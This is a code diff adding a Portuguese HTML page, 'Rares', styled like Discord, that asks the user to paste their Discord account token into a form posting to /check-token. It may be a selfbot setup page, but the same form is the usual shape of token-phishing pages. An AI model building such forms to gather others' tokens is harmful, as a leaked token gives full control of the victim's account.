@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Configurar Token - Rares</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: rgba(0, 0, 0, 0.8);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+            width: 400px;
+            text-align: center;
+        }
+
+        h1 {
+            margin-bottom: 30px;
+            font-family: 'Roboto', sans-serif;
+            font-size: 28px;
+        }
+
+        p {
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+
+        .textbox {
+            background-color: #333;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+            width: calc(100% - 20px);
+            box-sizing: border-box;
+            font-size: 18px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+            transition: box-shadow 0.3s ease;
+            outline: none;
+            text-align: center;
+        }
+
+        .textbox:focus {
+            box-shadow: 0 0 40px rgba(255, 255, 255, 0.4);
+        }
+
+        .button {
+            background-color: #7289da;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .button:hover {
+            background-color: #677bc4;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Configure sua token! 🛠</h1>
+        <p>Por favor, insira seu token do Discord abaixo:</p>
+        <form id="tokenForm" action="/check-token" method="POST">
+            <input type="text" id="token" name="token" class="textbox" placeholder="Token" required>
+            <button type="submit" class="button">⚙ Verificar</button>
+        </form>
+    </div>
+</body>
+</html>
